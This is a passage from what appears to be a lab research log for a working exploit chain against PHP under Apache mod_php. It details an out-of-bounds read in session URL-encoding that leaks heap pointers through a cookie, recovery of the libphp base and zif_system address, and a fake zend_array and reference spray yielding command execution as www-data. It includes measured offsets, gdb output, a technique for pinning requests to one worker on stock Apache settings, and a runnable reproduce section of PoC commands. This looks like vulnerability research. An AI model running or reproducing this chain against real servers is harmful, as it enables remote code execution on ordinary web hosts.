   the same thing out as `hdr = page*0x1000 - 0x1018`.

`b1_forge.py` therefore gained `--spec` with the reference's own vocabulary
(`F:<pages>`, `S:<pages>`, `A:<page>`, `G:<pages>:<page>`, `X:<n>`, plus `*N` repetition), `--tag`
(per-part data head `/<idx>BBBBB`) and `--save-cookie`. With
`--spec "G:511:0x137*14,G:400:0x137,X:900"` the body matches the reference builder part-for-part
(918 fields, every `G` length identical; the only differences are the progress value length and one
byte in the `X` field names).

**Measured, in the request.** `gdb/b_tail_live.gdb` breaks on `php_url_encode` when its length argument
is `0xc8000` — the exact out-of-bounds read — and scans the chunk:

```
[tl] libphp=0x7fffb50e0000  PS(id)=0x7fffb6b37000 chunk=0x7fffb6a00000 off=0x137000
[tl] free_pages=0 free_tail=512
[tl] module pointers: 12 pages, 876 total; zval_ptr_dtor=876
[tl]   page 0x1a6: 73   ... page 0x1ac: 73 ... page 0x1f9: 73
```

Twelve pages at 0x1a6-0x1f9, 876 `zval_ptr_dtor` qwords — all of them inside the window.

**A trap that cost another round.** The cookie does not contain those qwords unchanged: the session
encoder is `php_url_encode` (the `urlencode` flavour), so a **space byte becomes `+`**. `zval_ptr_dtor`
lives at `libphp+0x638120`, i.e. its low byte *is* 0x20, so every copy arrives as `...812b`. It is
lossless — a literal `0x2b` in memory is sent as `%2B` — but only if the decoder maps `+` back to 0x20,
which `poc/decode_leak_cookie.py` now does. Anything else in the window whose low byte is 0x20 is
corrupted the same way, so this is a property of the *channel*, not of this one symbol.

With that fixed, the leak alone determines the module base, and the parser accepts a single fingerprint
when it is backed by a large cluster (two coincidences no longer outrank 876 real pointers):

```
repeated qwords matched against symbol offsets:
  0x7fff2d8f8120 x876  - zval_ptr_dtor(0x638120) = 0x7fff2d2c0000
libphp base  : 0x7fff2d2c0000   (1 agreeing symbols, 876 pointers in the cluster)
=> zif_system would be 0x7fff2d6ecd70
=> libphp - disclosed chunk = -0x1940000 (6464 pages)
```

**Acceptance (3/3 fresh containers, gdb as ground truth, cookie-derived base compared with the base gdb
reads from `/proc/<pid>/maps`):**

```
run1 gdb_libphp=0x7ffef2980000 cookie_libphp=0x7ffef2980000  876 pointers  match=YES
run2 gdb_libphp=0x7ffee7b60000 cookie_libphp=0x7ffee7b60000  876 pointers  match=YES
run3 gdb_libphp=0x7ffecf970000 cookie_libphp=0x7ffecf970000  876 pointers  match=YES
```

**Why the leak route is the right one.** `gdb/delta_probe.gdb` (the reference's `libphp - main` / `libphp
- id` relation) shows the distance is *not* usable as a constant here: over four fresh containers it came
out as -6592, -6464, -6752 and -6624 pages. The spread is quantised at 32 pages (0x20000), so a delta
guess would need roughly six tries with a worker crash on each miss — the leak gives the base exactly, in
one request, with a 876-pointer margin.

**Where this leaves the chain:** A1 (arm) -> B (819 200-byte disclosure) -> libphp base is a complete,
repeatable, pure-HTTP disclosure, and G1's exit criterion is met. What is still missing is the second
half: `hsv` (`main + 0x7D720`) and the fake `zend_array` at `main + 0xF8398` need the **main chunk**
base, which the same window does give as a cluster (81 pointers here, the reference expects ~87), and
then A2 (`cheap_oom_a`) plus B2 (`fake_ref_b`) have to be rebuilt against our image.

## Iteration 23: the execution stage runs (G2 closed for the single-worker baseline)

Iteration 22 left the module base. The second half is A2 plus B2, and the two heap slots they need --
`hsv` (`main+0x7D720`, the stale zval the spray has to cover) and `S` (`main+0xF8398`, where the fake
`zend_array` has to start) -- turned out to hold on this image unchanged, so the reference's layout
constants are valid here too. What had to be re-measured is everything that differs between builds:

| symbol | this image | how |
|---|---|---|
| `zval_ptr_dtor` | `0x638120` | 876-copy cluster in the disclosure |
| `zif_system` | `0x42CD70` | `&zif_system` resolves in the lab image (no debug info, but the symbol is there) |
| `zend_hash_destroy` | `0x5EEFC8` | second fingerprint |
| `php_url_encode` | `0x484820` | names the disclosure site when breaking on it |
| main chunk | disclosed chunk `+0x400000` | leak cluster `0x7fff96600000` == `alloc_globals->heap` chunk from gdb, same run |

`poc/leak_addrs.py` applies those relations to a cookie and emits either a report or shell
assignments. `poc/a2_cheap_oom.py`, `poc/mk_fake_ht.py` and `poc/b2_exec.py` are our own
implementations of the arming shape, the fake `zend_array` carrier and the fake-reference spray;
`poc/chain.sh` drives the four steps and pulls the proof out of the container.

**Measured, 3/3 fresh containers, our tools only** (`chain.sh`, `--cmd 'id>/tmp/pwn.txt'`):

```
run1 libphp=0x7fff6d9c0000 main=0x7fff6f800000 S=0x7fff6f8f8398 hsv=0x7fff6f87d720 -> uid=33(www-data)
run2 libphp=0x7fffa76d0000 main=0x7fffa9400000 S=0x7fffa94f8398 hsv=0x7fffa947d720 -> uid=33(www-data)
run3 libphp=0x7fff87c10000 main=0x7fff89a00000 S=0x7fff89af8398 hsv=0x7fff89a7d720 -> uid=33(www-data)
```

and a fourth run with an arbitrary command, to show it is `system()` and not a fixed payload:

```
aarch64 / 27a3b63bf5cd / 33        (uname -m, hostname, id -u)
```

**And 3/3 on the stock official MPM** — `StartServers 5`, `MaxRequestWorkers 150`, no container
override — with `chain.sh --workers 150`, which holds 149 half-sent connections
(`poc/hold_workers.py`) so all four steps stay on one child:

```
stock run1 libphp=0x7fff664e0000 main=0x7fff68200000 -> uid=33(www-data)
stock run2 libphp=0x7fffb6210000 main=0x7fffb8000000 -> uid=33(www-data)
stock run3 libphp=0x7ffecc750000 main=0x7ffece600000 -> uid=33(www-data)
```

Note the worker segfaults after the command runs -- the same destroy path that calls `pDestructor`
unwinds through a fake array -- which is why the proof is written to a file.

The full description, address model and runbook live in `POC_CHAIN.md`.

## Reproduce

```bash
cd ~/labs/local/php2shell-modphp-lab
cd ~/labs/local/php2shell-modphp-lab
# the whole disclosure chain, as it stands: arm, leak, and the module base out of the cookie
docker rm -f p2s-pure-18110; (cd pure && bash run_pure.sh --single); sleep 2
python3 poc/a1_arm.py --url http://127.0.0.1:18110/index.php --repeat 1 --sid-hex 00 --big 78 \
        --query-n 5 --query-len 1 --timeout 120
python3 poc/b1_forge.py --url http://127.0.0.1:18110/index.php \
        --spec "G:511:0x137*14,G:400:0x137,X:900" --fake-len 0xC8000 \
        --sid a --progress-first --chunked --save-cookie /tmp/ck.txt
python3 poc/decode_leak_cookie.py --cookie-file /tmp/ck.txt     # -> libphp base, zif_system

# the same request, instrumented: what the encoder actually reads
sudo gdb -q -batch -p <worker> -x gdb/b_dtor_tag.gdb > /tmp/dtag.log 2>&1 &
python3 poc/b1_forge.py ... --spec "..." --fake-len 0xC8000 --sid a --progress-first --chunked
grep '^\[dt\]' /tmp/dtag.log                                    # ground truth for the comparison
```

```bash
# what the pointer is, and where the values go, in one processMARKER=$(openssl rand -hex 16)
sudo env B1_MARKER=$MARKER gdb -q -batch -p <worker> -x gdb/b1_place_scan.gdb > /tmp/p.log 2>&1 &
python3 poc/a1_arm.py --url http://127.0.0.1:8130/ --progress-first        # arm
python3 poc/b1_forge.py --url http://127.0.0.1:8130/ --off 0x540c0 \
        --fake-len 0x20 --values 1 --hdr-stride 0x1000 --tail-vars 0 --marker $MARKER
python3 poc/placement_summary.py /tmp/p.log                               # per-chunk pages

# the chunk's own page map, between requests and during one
sudo gdb -q -batch -p <worker> -x gdb/chunk_map.py
sudo env CM_AT_LIMIT=0x70 gdb -q -batch -p <worker> -x gdb/chunk_map_at.gdb
```

`poc/b1_forge.py` now sends `--values N` full-chunk values (`--chunked` optional, default
Content-Length), `poc/b1_spray.py` sends `--count N` values of `--pages P` with a forged header on
every page, and `poc/deploy.sh` pushes `poc/`, `gdb/` and the labs to the measurement host so a
runbook step cannot fail on a stale tool.

`poc/b1_probe.py` takes `--cookie`, `--progress-len`, `--file-bytes`, `--tail-kib`, `--no-file`
and `--chunked`; the default shape is the cookie-less variant measured in iteration 2.
